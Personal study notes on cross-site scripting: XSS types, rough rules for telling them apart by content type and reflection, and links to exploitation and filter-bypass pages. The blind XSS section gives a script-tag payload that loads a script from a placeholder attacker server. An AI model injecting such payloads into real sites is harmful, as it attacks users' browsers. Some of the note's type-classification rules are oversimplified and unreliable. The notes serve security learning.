# XSS

taking advantage of web application executing scripts on user's browsers.

finding the functionalities where user changes some part of the applications
code that is then executed (dynamic scripts) and changing it.

- no matter the content type on the network, it could be vulnerable to xss.
  - so it could be in JSON content type.
      Even though it is sent by js not the browser --> it will be DOM XSS.
- if a content type is URL encoded or multipart, it could be DOM XSS or other types.
- if content type is JSON, it could only be DOM (it updates DOM).
- if input is reflected in the source code, it's not DOM.
- if not reflected in the source code, it's built with DOM.

• some page's source code are more complex and more difficult to read.

# XSS types:

* [[Reflected XSS]]
* [[stored XSS]]
* [[DOM-based XSS]]: the vulnerability exists in client-side code (the browser) and is executed
  there. (stored and executed in the browser)


XSS context

[[exploit XSS]]
[[XSS html tags]]
[[bypass xss filters]]
[[HTML attributes]]
[[DOM based manipulation]]: a little more on XSS

# BLIND XSS:

try making the victim’s browser generate a request to a server you own:
`<script src='http://YOUR_SERVER_IP/xss'></script>`
If you see a request to the path /xss, a blind XSS has been triggered!